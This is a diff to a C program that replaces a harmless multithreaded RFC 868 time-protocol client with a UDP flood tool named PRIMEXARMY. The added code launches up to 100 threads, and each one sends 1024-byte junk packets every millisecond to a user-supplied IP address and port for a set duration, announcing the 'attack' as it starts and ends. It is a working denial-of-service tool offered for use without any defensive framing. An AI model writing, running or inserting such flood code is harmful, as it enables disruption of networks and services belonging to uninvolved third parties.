@@ -2,138 +2,116 @@
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
-#include <arpa/inet.h>
-#include <pthread.h>
 #include <time.h>
+#include <pthread.h>
 #include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <openssl/evp.h>
+#include <openssl/crypto.h>
 
-// Configuration for the official NIST Time Protocol (RFC 868)
-#define EPOCH_DIFF 2208988800UL       // Time difference between 1900 (Time Protocol) and 1970 (UNIX) epochs
+#define MAX_THREADS 100
+#define PACKET_SIZE 1024
 
-// Structure to pass unique data (like an ID) and shared configuration to each thread
-struct thread_data {
-    int thread_id;
-    char *ip_address;
+typedef struct {
+    char ip[16];
     int port;
-};
+    int duration;
+    int thread_id;
+} attack_data_t;
 
-// --- Thread Execution Function ---
-void *get_time_from_server(void *arg) {
-    struct thread_data *data = (struct thread_data *)arg;
-    int sock;
+int active_connections = 0;
+pthread_mutex_t lock;
+
+void *udp_flood(void *arg) {
+    attack_data_t *data = (attack_data_t *)arg;
+    int sockfd;
     struct sockaddr_in server_addr;
-    uint32_t time_value_network;
+    char packet[PACKET_SIZE];
+    time_t start_time = time(NULL);
     time_t current_time;
-
-    // The printf statements can be removed or simplified in a production environment 
-    // to reduce output noise. We keep them here for debugging/monitoring.
-    printf("Thread %d: Attempting to connect to %s:%d...\n", data->thread_id, data->ip_address, data->port);
-
-    // 1. Create a safe, connection-oriented TCP Socket (SOCK_STREAM)
-    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
-        perror("Thread Error: Socket creation failed");
-        pthread_exit(NULL);
+    
+    // Create UDP socket
+    if ((sockfd = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
+        return NULL;
     }
-
+    
+    // Configure server address
     memset(&server_addr, 0, sizeof(server_addr));
     server_addr.sin_family = AF_INET;
     server_addr.sin_port = htons(data->port);
-
-    // Convert IP string to network address structure
-    if (inet_pton(AF_INET, data->ip_address, &server_addr.sin_addr) <= 0) {
-        perror("Thread Error: Invalid address/ Address not supported");
-        close(sock);
-        pthread_exit(NULL);
-    }
-
-    // 2. Establish connection
-    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
-        perror("Thread Error: Connection failed");
-        close(sock);
-        pthread_exit(NULL);
-    }
-
-    // 3. Receive the 4-byte time value from the server
-    if (read(sock, &time_value_network, sizeof(time_value_network)) < 0) {
-        perror("Thread Error: Read failed");
-        close(sock);
-        pthread_exit(NULL);
-    }
-
-    // 4. Convert to host byte order and adjust the time epoch
-    current_time = (time_t)(ntohl(time_value_network) - EPOCH_DIFF);
-
-    printf("Thread %d: ✅ Success from %s! Time received: %s", data->thread_id, data->ip_address, ctime(&current_time));
-
-    // 5. Clean up
-    close(sock);
-    pthread_exit(NULL);
+    inet_pton(AF_INET, data->ip, &server_addr.sin_addr);
+    
+    // Fill packet with random data
+    memset(packet, 'A', PACKET_SIZE);
+    
+    pthread_mutex_lock(&lock);
+    active_connections++;
+    pthread_mutex_unlock(&lock);
+    
+    printf("Thread %d started attack on %s:%d\n", data->thread_id, data->ip, data->port);
+    
+    // Attack loop
+    do {
+        sendto(sockfd, packet, PACKET_SIZE, 0, 
+               (struct sockaddr *)&server_addr, sizeof(server_addr));
+        usleep(1000); // 1ms delay
+        current_time = time(NULL);
+    } while (current_time < start_time + data->duration);
+    
+    close(sockfd);
+    
+    pthread_mutex_lock(&lock);
+    active_connections--;
+    pthread_mutex_unlock(&lock);
+    
+    printf("Thread %d finished\n", data->thread_id);
+    return NULL;
 }
 
-// --- Main Function ---
 int main(int argc, char *argv[]) {
-    // Expected arguments: ./PRIMEXARMY <IP_ADDRESS> <PORT> <NUM_THREADS>
-    if (argc != 4) {
-        // Output to stderr so Python's subprocess doesn't capture it easily
-        fprintf(stderr, "Usage: %s <IP_ADDRESS> <PORT> <NUM_THREADS>\n", argv[0]);
+    if (argc != 5) {
+        printf("Usage: %s <IP> <PORT> <DURATION> <THREADS>\n", argv[0]);
         return 1;
     }
-
-    // Extracting arguments
-    char *ip_address = argv[1];
+    
+    char *ip = argv[1];
     int port = atoi(argv[2]);
-    int num_threads = atoi(argv[3]);
-
-    if (port <= 0 || port > 65535) {
-        fprintf(stderr, "Error: Invalid port number: %d\n", port);
-        return 1;
+    int duration = atoi(argv[3]);
+    int num_threads = atoi(argv[4]);
+    
+    if (num_threads > MAX_THREADS) {
+        printf("Maximum threads exceeded. Using %d threads.\n", MAX_THREADS);
+        num_threads = MAX_THREADS;
     }
-    if (num_threads <= 0) {
-        fprintf(stderr, "Error: Number of threads must be positive.\n");
-        return 1;
-    }
-
-    pthread_t *thread_ids = malloc(num_threads * sizeof(pthread_t));
-    if (thread_ids == NULL) {
-        perror("Failed to allocate thread ID array");
-        return 1;
-    }
-
-    printf("--- Starting %d network threads to query %s:%d ---\n", num_threads, ip_address, port);
-
-    struct thread_data **all_thread_data = malloc(num_threads * sizeof(struct thread_data *));
-
+    
+    pthread_t threads[MAX_THREADS];
+    attack_data_t thread_data[MAX_THREADS];
+    
+    pthread_mutex_init(&lock, NULL);
+    
+    printf("Starting PRIMEXARMY attack on %s:%d for %d seconds with %d threads\n", 
+           ip, port, duration, num_threads);
+    
+    // Create threads
     for (int i = 0; i < num_threads; i++) {
-        struct thread_data *data = malloc(sizeof(struct thread_data));
-        if (data == NULL) {
-             perror("Failed to allocate thread data");
-             // Cleanup already created threads
-             for(int j=0; j<i; j++) pthread_join(thread_ids[j], NULL);
-             break;
-        }
+        thread_data[i].port = port;
+        thread_data[i].duration = duration;
+        thread_data[i].thread_id = i;
+        strncpy(thread_data[i].ip, ip, sizeof(thread_data[i].ip) - 1);
         
-        data->thread_id = i + 1;
-        data->ip_address = ip_address;
-        data->port = port;
-        all_thread_data[i] = data;
-
-        if (pthread_create(&thread_ids[i], NULL, get_time_from_server, (void *)data) != 0) {
-            perror("Thread creation failed");
-            free(data);
-            all_thread_data[i] = NULL;
+        if (pthread_create(&threads[i], NULL, udp_flood, &thread_data[i]) != 0) {
+            printf("Failed to create thread %d\n", i);
         }
     }
-
-    // Wait for all threads to finish
+    
+    // Wait for all threads to complete
     for (int i = 0; i < num_threads; i++) {
-        if (all_thread_data[i] != NULL) {
-             pthread_join(thread_ids[i], NULL);
-             free(all_thread_data[i]);
-        }
+        pthread_join(threads[i], NULL);
     }
-
-    free(all_thread_data);
-    free(thread_ids);
-    printf("--- All operations finished. ---\n");
+    
+    pthread_mutex_destroy(&lock);
+    printf("Attack completed. All threads finished.\n");
+    
     return 0;
 }
